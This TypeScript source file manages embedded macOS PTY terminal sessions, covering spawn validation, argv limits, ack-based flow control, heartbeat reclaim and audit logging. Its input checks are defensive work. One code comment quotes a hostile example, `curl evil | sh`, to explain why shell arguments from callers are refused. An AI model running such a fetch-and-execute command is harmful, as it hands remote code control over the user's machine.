// Embedded PTY sessions — at most one live process (spec §5).
// Kill tree on close / heartbeat / process exit. Ack watermark → pause.

import { spawn } from "child_process"
import { isAbsolute } from "node:path"
import { appendCapabilityAudit } from "../packs/audit-log"
import { loadNodePty, type PtyHandle, type PtySpawnFn } from "./load-native"
import { buildTerminalEnv } from "./env"

/**
 * Total (never-throwing) rendering of a caller-supplied value for a refusal message.
 * `JSON.stringify` is NOT total: it throws on BigInt and circular structures, it invokes a
 * caller-supplied `toJSON` (which may itself throw), and it renders `Symbol()` as `undefined`.
 * The try/catch in `spawnPtySession` only wraps `spawnFn`, so a throw raised from a *refusal*
 * branch escapes to the caller as an exception instead of `{ok:false}` — i.e. a caller passing a
 * non-JSON `file` would crash instead of being refused. Keep this total for ANY input.
 */
function describeValue(v: unknown): string {
  try {
    switch (typeof v) {
      case "string":
        return JSON.stringify(v)
      case "number":
      case "boolean":
      case "bigint":
      case "symbol":
        return String(v)
      default:
        return Object.prototype.toString.call(v)
    }
  } catch {
    return "[unprintable]"
  }
}

function killPidTree(pid: number): void {
  if (pid <= 0) return
  if (process.platform === "win32") {
    try {
      spawn("taskkill", ["/pid", String(pid), "/T", "/F"], { stdio: "ignore", windowsHide: true })
    } catch {
      /* ignore */
    }
    return
  }
  try {
    process.kill(-pid, "SIGKILL")
  } catch {
    try {
      process.kill(pid, "SIGKILL")
    } catch {
      /* ignore */
    }
  }
}

export const TERMINAL_DATA_CHUNK_BYTES = 16 * 1024
export const TERMINAL_HIGH_WATER_UNACKED = 64 * 1024
export const TERMINAL_LOW_WATER_UNACKED = 16 * 1024
export const TERMINAL_MAX_UNACKED = 256 * 1024
export const TERMINAL_HEARTBEAT_MS = 45_000
/** Upper bound on the summed UTF-8 byte length of a caller-supplied argv (#502 C). */
export const MAX_PTY_ARGV_BYTES = 128 * 1024
/** Refusal code for malformed `spawnPtySession` opts: nothing was spawned, so it is not a spawn failure. */
export const INVALID_PTY_OPTS = "invalid_pty_opts"

export type TerminalClosedCode = number | "unsupported" | "denied" | "killed" | string

type LiveSession = {
  id: string
  handle: PtyHandle
  threadId?: string
  reviewId?: string
  /** WS peer that opened this PTY; WS-close kills only this owner's session. */
  owner?: unknown
  cwd: string
  seq: number
  unacked: Map<number, number>
  unackedBytes: number
  paused: boolean
  lastClientAt: number
  heartbeat: ReturnType<typeof setInterval>
  send: (frame: Record<string, unknown>) => void
}

let live: LiveSession | null = null
let spawnOverride: PtySpawnFn | null = null
let heartbeatMs = TERMINAL_HEARTBEAT_MS
let platformOverride: NodeJS.Platform | null = null
let exitHookInstalled = false

export function __testSetPtySpawn(fn?: PtySpawnFn): void {
  spawnOverride = fn || null
}

export function __testSetPtyHeartbeatMs(ms?: number): void {
  heartbeatMs = typeof ms === "number" && ms > 0 ? ms : TERMINAL_HEARTBEAT_MS
}

export function __testSetPtyPlatform(p?: NodeJS.Platform): void {
  platformOverride = p ?? null
}

export function __testResetPtySessions(): void {
  const s = live
  live = null
  if (s) {
    clearInterval(s.heartbeat)
    try {
      s.handle.kill()
    } catch {
      /* ignore */
    }
  }
  spawnOverride = null
  heartbeatMs = TERMINAL_HEARTBEAT_MS
  platformOverride = null
}

export function getLivePtyId(): string | null {
  return live?.id ?? null
}

/** Stable object identity permits rechecking the same session after confirmation. */
export function getOwnedPtyContext(id: string, owner: unknown): Readonly<{ threadId?: string; reviewId?: string }> | null {
  if (!owner || typeof owner !== "object" || !("readyState" in owner) || owner.readyState !== 1) return null
  return owner && live?.id === id && live.owner === owner ? live : null
}

export function killPtyByThreadId(threadId: string): boolean {
  if (!live || live.threadId !== threadId) return false
  closeLive("killed")
  return true
}

/** Kill the live PTY only if it was opened by this WS peer (NIT-1). */
export function killPtyByPeer(peer: unknown): boolean {
  if (!peer || !live || live.owner !== peer) return false
  closeLive("killed")
  return true
}

export function killAllPty(): void {
  if (live) closeLive("killed")
}

export function ptyHostPlatform(): NodeJS.Platform {
  return platformOverride ?? process.platform
}

function installExitHook(): void {
  if (exitHookInstalled) return
  exitHookInstalled = true
  const halt = () => {
    try {
      killAllPty()
    } catch {
      /* ignore */
    }
  }
  process.on("SIGTERM", halt)
  process.on("SIGINT", halt)
  process.on("beforeExit", halt)
}

function closeLive(code: TerminalClosedCode, extra?: { signal?: number; error?: string }): void {
  const s = live
  if (!s) return
  live = null
  clearInterval(s.heartbeat)
  try {
    const pid = s.handle.pid
    if (typeof pid === "number" && pid > 0) killPidTree(pid)
    s.handle.kill()
  } catch {
    /* ignore */
  }
  appendCapabilityAudit({
    type: "terminal.close",
    at: new Date().toISOString(),
    id: s.id,
    cwd: s.cwd,
    pid: s.handle.pid,
    code,
    ...(s.threadId ? { thread_id: s.threadId } : {}),
  })
  s.send({
    type: "terminal.closed",
    id: s.id,
    code,
    signal: extra?.signal ?? 0,
    ...(extra?.error ? { error: extra.error } : {}),
  })
}

function maybePause(s: LiveSession): void {
  if (!s.paused && s.unackedBytes >= TERMINAL_HIGH_WATER_UNACKED) {
    s.paused = true
    try {
      s.handle.pause()
    } catch {
      /* ignore */
    }
  }
}

function maybeResume(s: LiveSession): void {
  if (s.paused && s.unackedBytes <= TERMINAL_LOW_WATER_UNACKED) {
    s.paused = false
    try {
      s.handle.resume()
    } catch {
      /* ignore */
    }
  }
}

function emitChunks(s: LiveSession, text: string): void {
  const buf = Buffer.from(text, "utf8")
  for (let i = 0; i < buf.length;) {
    if (live !== s) return
    let end = Math.min(buf.length, i + TERMINAL_DATA_CHUNK_BYTES)
    // Frames remain independently UTF-8 decodable, including at CJK boundaries.
    while (end < buf.length && (buf[end] & 0xc0) === 0x80) end--
    const slice = buf.subarray(i, end)
    i = end
    if (s.unackedBytes + slice.length > TERMINAL_MAX_UNACKED) {
      closeLive("output_overflow", { error: "终端输出未被及时确认，已停止会话以保护内存。请重新打开。" })
      return
    }
    s.seq += 1
    const seq = s.seq
    s.unacked.set(seq, slice.length)
    s.unackedBytes += slice.length
    s.send({
      type: "terminal.data",
      id: s.id,
      seq,
      b64: slice.toString("base64"),
    })
    maybePause(s)
  }
}

export function spawnPtySession(opts: {
  id: string
  cols: number
  rows: number
  cwd: string
  /** #502 C: agent embed launches an explicit executable instead of the login shell. Absolute only.
   *  `undefined` = caller omitted it (interactive tab) → `$SHELL` default. A supplied value that is
   *  not a non-empty absolute path is refused — never defaulted, never trimmed/repaired. (`$SHELL`
   *  itself IS trimmed once, on the default branch below: a padded env value is not a path.) */
  file?: string
  /** #502 C: explicit argv for that executable; `[]` means "no args". Requires an explicit `file`:
   *  a caller-supplied argv without one is refused (see `spawnPtySession`). `undefined` → `[]` when
   *  `file` is given, `["-l"]` only for the `$SHELL` default. Non-string entries inside a real array
   *  are dropped; a non-array, an empty-string entry, or an argv over `MAX_PTY_ARGV_BYTES` is a
   *  caller bug and refused. */
  args?: string[]
  threadId?: string
  reviewId?: string
  owner?: unknown
  send: (frame: Record<string, unknown>) => void
}): { ok: true; pid: number } | { ok: false; error: string; code?: TerminalClosedCode } {
  if (ptyHostPlatform() !== "darwin") {
    return {
      ok: false,
      error: "内嵌终端仅支持 macOS（darwin）；Windows/Linux 另票。",
      code: "unsupported",
    }
  }
  if (live) {
    return { ok: false, error: "terminal_busy" }
  }

  // #502 C invariant: the `-l` login-shell default and caller-supplied argv can never mix.
  // `$SHELL` + caller argv is a free shell (`args: ["-c", "curl evil | sh"]`), so the agent-argv
  // feature would double as a general shell-argv injector. Refused before env work and before any
  // spawnFn call — including for `[]`, which is still a caller shaping the shell invocation.
  const hasFile = opts.file !== undefined
  if (!hasFile && opts.args !== undefined) {
    return {
      ok: false,
      error: "embedded terminal args require an explicit absolute file",
      code: INVALID_PTY_OPTS,
    }
  }

  const cols = Math.min(500, Math.max(1, Math.floor(opts.cols) || 80))
  const rows = Math.min(200, Math.max(1, Math.floor(opts.rows) || 24))
  // #502 C: `undefined` (caller omitted `file`) keeps today's login-shell default. A *supplied*
  // file — including `""`, which means "agent path resolution failed" — must be a non-empty
  // absolute path; substituting `$SHELL` here would claim "agent running" while handing the user
  // an unrequested login shell. Refused before env work and before any spawnFn call.
  let file: string
  if (opts.file === undefined) {
    // `$SHELL` is trimmed ONCE and the trimmed value is what spawns: `" /bin/bash "` cannot exist
    // as a path, so trimming only for the emptiness check would guarantee ENOENT.
    const shell = process.env.SHELL?.trim()
    file = shell ? shell : "/bin/zsh"
  } else if (typeof opts.file === "string" && opts.file.length > 0 && isAbsolute(opts.file)) {
    // Used exactly as given: no trim/normalization of a malformed supplied path. This no-trim rule
    // deliberately diverges from `rejectNonAbsoluteCommand` (src/acp/open-local-terminal.ts), which
    // owns the same "must be absolute" rule WITH trimming (`" /bin/zsh"` is accepted there and
    // refused here). The divergence is intentional; the two are wired together by a later task, so
    // do not "unify" one into the other.
    file = opts.file
  } else {
    return {
      ok: false,
      error: `embedded terminal file must be a non-empty absolute path (got ${describeValue(opts.file)})`,
      code: INVALID_PTY_OPTS,
    }
  }
  // #502 C: `-l` is a login-shell flag and belongs to the `$SHELL` default only — an explicit
  // executable (agent binary) gets `[]` when the caller supplied no argv. A real array keeps only
  // its string entries (junk dropped). Anything else is a bug in the agent-spec builder — falling
  // back to `["-l"]` would launch `$SHELL -l` under an "agent running" tab, so it is refused
  // loudly before spawning.
  let args: string[]
  if (opts.args === undefined) {
    args = hasFile ? [] : ["-l"]
  } else if (Array.isArray(opts.args)) {
    args = opts.args.filter((a): a is string => typeof a === "string")
    // An empty argv entry is refused, consistently with the empty-`file` rule above: `exec` would
    // receive a real empty slot that some binaries read as a positional value, and silently
    // dropping it would hide the builder bug instead of reporting it.
    const emptyAt = args.indexOf("")
    if (emptyAt >= 0) {
      return {
        ok: false,
        error: `embedded terminal args must not contain an empty entry (index ${emptyAt})`,
        code: INVALID_PTY_OPTS,
      }
    }
  } else {
    return { ok: false, error: "embedded terminal args must be a string[]", code: INVALID_PTY_OPTS }
  }
  // Every neighbour bounds its payload. An argv over ARG_MAX passes the spawn call and fails
  // asynchronously (`posix_spawn failed: Argument list too long`), which would open the tab and
  // then kill it — indistinguishable from a real exec failure.
  const argvBytes = args.reduce((n, a) => n + Buffer.byteLength(a, "utf8"), 0)
  if (argvBytes > MAX_PTY_ARGV_BYTES) {
    return {
      ok: false,
      error: `embedded terminal args exceed MAX_PTY_ARGV_BYTES (${MAX_PTY_ARGV_BYTES}); got ${argvBytes} bytes`,
      code: INVALID_PTY_OPTS,
    }
  }
  const env = buildTerminalEnv()
  const spawnFn: PtySpawnFn = spawnOverride || ((f, a, o) => loadNodePty().spawn(f, a, o))

  let handle: PtyHandle
  try {
    handle = spawnFn(file, args, { name: "xterm-256color", cols, rows, cwd: opts.cwd, env })
  } catch (e: any) {
    return { ok: false, error: e?.message || String(e), code: "spawn_failed" }
  }

  installExitHook()
  const session: LiveSession = {
    id: opts.id,
    handle,
    threadId: opts.threadId,
    reviewId: opts.reviewId,
    owner: opts.owner,
    cwd: opts.cwd,
    seq: 0,
    unacked: new Map(),
    unackedBytes: 0,
    paused: false,
    lastClientAt: Date.now(),
    heartbeat: setInterval(() => {
      const s = live
      if (!s || s.id !== opts.id) return
      // Last-resort orphan reclaim. Client ping/input/ack/resize reset lastClientAt
      // so a quiet-but-watched tab (vim/man/ssh idle) is not SIGKILL'd.
      if (Date.now() - s.lastClientAt > heartbeatMs) closeLive("killed")
    }, Math.min(heartbeatMs, 5000)),
    send: opts.send,
  }
  session.heartbeat.unref?.()
  live = session

  handle.onData((data) => {
    if (live !== session) return
    emitChunks(session, data)
  })
  handle.onExit(({ exitCode, signal }) => {
    if (live !== session) return
    closeLive(typeof exitCode === "number" ? exitCode : 0, { signal: signal ?? 0 })
  })

  appendCapabilityAudit({
    type: "terminal.open",
    at: new Date().toISOString(),
    id: opts.id,
    cwd: opts.cwd,
    pid: handle.pid,
    ...(opts.threadId ? { thread_id: opts.threadId } : {}),
  })

  return { ok: true, pid: handle.pid }
}

export function noteClientActivity(id: string): boolean {
  if (!live || live.id !== id) return false
  live.lastClientAt = Date.now()
  return true
}

/** Internal keepalive; the WS handler rejects unknown/unowned sessions first. */
export function pingPty(id: string): { ok: true } {
  noteClientActivity(id)
  return { ok: true }
}

export function writePtyInput(id: string, b64: string): { ok: true } | { ok: false; error: string } {
  if (!noteClientActivity(id) || !live) return { ok: false, error: "terminal_not_found" }
  // Allow large user pastes, but reject malformed/noncanonical payloads before write.
  if (!b64 || b64.length > 1024 * 1024 || b64.length % 4 !== 0 || !/^[A-Za-z0-9+/]*={0,2}$/.test(b64)) {
    return { ok: false, error: "invalid_b64" }
  }
  const raw = Buffer.from(b64, "base64")
  if (raw.toString("base64") !== b64) return { ok: false, error: "invalid_b64" }
  try {
    live.handle.write(raw.toString("utf8"))
  } catch (e: any) {
    return { ok: false, error: e?.message || String(e) }
  }
  return { ok: true }
}

export function resizePty(id: string, cols: number, rows: number): { ok: true } | { ok: false; error: string } {
  if (!noteClientActivity(id) || !live) return { ok: false, error: "terminal_not_found" }
  try {
    live.handle.resize(
      Math.min(500, Math.max(1, Math.floor(cols) || 80)),
      Math.min(200, Math.max(1, Math.floor(rows) || 24)),
    )
  } catch (e: any) {
    return { ok: false, error: e?.message || String(e) }
  }
  return { ok: true }
}

export function ackPty(id: string, seq: number): { ok: true } | { ok: false; error: string } {
  if (!noteClientActivity(id) || !live) return { ok: false, error: "terminal_not_found" }
  const s = live
  for (const [q, n] of [...s.unacked.entries()]) {
    if (q <= seq) {
      s.unacked.delete(q)
      s.unackedBytes = Math.max(0, s.unackedBytes - n)
    }
  }
  maybeResume(s)
  return { ok: true }
}

export function pausePty(id: string): { ok: true } | { ok: false; error: string } {
  if (!noteClientActivity(id) || !live) return { ok: false, error: "terminal_not_found" }
  live.paused = true
  try {
    live.handle.pause()
  } catch {
    /* ignore */
  }
  return { ok: true }
}

export function resumePty(id: string): { ok: true } | { ok: false; error: string } {
  if (!noteClientActivity(id) || !live) return { ok: false, error: "terminal_not_found" }
  if (live.unackedBytes > TERMINAL_LOW_WATER_UNACKED) return { ok: false, error: "terminal_waiting_for_ack" }
  live.paused = false
  try {
    live.handle.resume()
  } catch {
    /* ignore */
  }
  return { ok: true }
}

export function closePty(id: string): { ok: true } | { ok: false; error: string } {
  if (!live || live.id !== id) return { ok: false, error: "terminal_not_found" }
  closeLive(0)
  return { ok: true }
}

/** Expose for tests: unacked byte count of the live session. */
export function __testPtyUnackedBytes(): number {
  return live?.unackedBytes ?? 0
}

export function __testPtyPaused(): boolean {
  return live?.paused === true
}

export function __testPtyLastClientAt(): number {
  return live?.lastClientAt ?? 0
}

export function __testAgePtyClient(ms: number): void {
  if (live) live.lastClientAt -= ms
}
